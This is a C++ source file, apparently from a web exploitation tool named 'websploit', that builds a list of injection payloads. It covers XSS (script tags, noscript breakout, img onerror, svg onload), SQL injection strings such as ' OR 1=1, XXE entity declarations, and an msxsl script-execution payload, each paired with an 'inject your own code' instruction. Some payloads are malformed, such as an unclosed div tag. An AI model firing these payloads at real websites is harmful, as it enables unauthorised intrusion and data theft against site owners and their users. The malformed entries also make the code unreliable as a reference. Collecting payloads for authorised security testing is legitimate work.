#include "websploit.h"

vector<exploit> initExploits() {
	vector<exploit> exploits = vector<exploit>();

	exploits.push_back(exploit("xss_basic", "<script>testing</script>", "<script>testing</script>", "ns", "ns", "ns", "<noscript>", "</noscript>", 
		"Inject your own code by simply putting it in <script> tags."));
	exploits.push_back(exploit("xss_anti_nscript", "</noscript><script>testing</script><noscript>", "</noscript><script>testing</script><noscript>", "ns", "ns", "ns", "<noscript>", "</noscript>",
		"Inject your own code by typing a </noscript> tag at the start and a <noscript> tag at they end, then inserting you code in <script> tags."));
	exploits.push_back(exploit("xss_img_onerror", "<img src='x' onerror='testing');>", "<img src='x' onerror='testing');>", "ns", "ns", "ns", "ns", "ns",
		"Inject your own code by using the <img> onerror atribute with an invalid image."));
	exploits.push_back(exploit("xss_svg_onload", "<svg onload='testing'>", "<svg onload='testing'>", "ns", "ns", "ns", "ns", "ns",
		"Inject your own code by using the <svg> onload atribute."));
	exploits.push_back(exploit("xss_div_onpointerenter", "<div onpointerover='testing'</div>", "<div onpointerover='testing'</div>", "ns", "ns", "ns", "ns", "ns",
		"Inject your own code by using the <div> onload onpointerover."));
	exploits.push_back(exploit("xss_js_injection", ";testing;", ";testing;", "ns", "<script>", "</script>", "ns", "ns",
		"Inject your own code by enclosing it in semicolons."));

	exploits.push_back(exploit("sql_inj_apost", "' OR 1=1", "ns", "' OR 1=1", "ns", "ns", "ns", "ns",
		"Inject your own SQL by starting your query with an apostrophy."));
	exploits.push_back(exploit("sql_inj_smark", "\" OR 1=1", "ns", "\" OR 1=1", "ns", "ns", "ns", "ns",
		"Inject your own SQL by starting your query with a speach mark."));
	exploits.push_back(exploit("sql_inj_apost_all", "'*'", "ns", "'*'", "ns", "ns", "ns", "ns",
		"Inject your own SQL by using '*'"));
	exploits.push_back(exploit("sql_inj_smark_all", "\"*\"", "ns", "\"*\"", "ns", "ns", "ns", "ns",
		"Inject your own SQL by using \"*\""));

	exploits.push_back(exploit("xxe_basic", "<!ENTITY test SYSTEM 'https://google.com'>", "ns", "<!ENTITY test SYSTEM 'https://google.com'>", "ns", "ns", "ns", "ns",
		"Inject your own XML by using entities."));
	exploits.push_back(exploit("xxe_isoamsa", "<!ENTITY % ISOamsa '<!ENTITY &#x25; file SYSTEM \"https://google.com\">'>", "ns", "<!ENTITY % ISOamsa '<!ENTITY &#x25; file SYSTEM \"https://google.com\">'>", "ns", "ns", "ns", "ns",
		"Inject your own XML by using the ISOamsa instruction:\n<!ENTITY % ISOamsa 'your-entity-here'>"));

	exploits.push_back(exploit("xsl_code_excec", "<msxsl:script language = 'C#' implements-prefix = 'user'>< ![CDATA[testing]] >< / msxsl:script>", "ns", "<msxsl:script language = 'C#' implements-prefix = 'user'>< ![CDATA[testing]] >< / msxsl:script>", "ns", "ns", "ns", "ns",
		"Inject your own XSL by using the msxsl instruction:\n<msxsl:script language = 'C#' implements-prefix = 'user'>< ![CDATA[testing]] >< / msxsl:script>"));

	return exploits;
}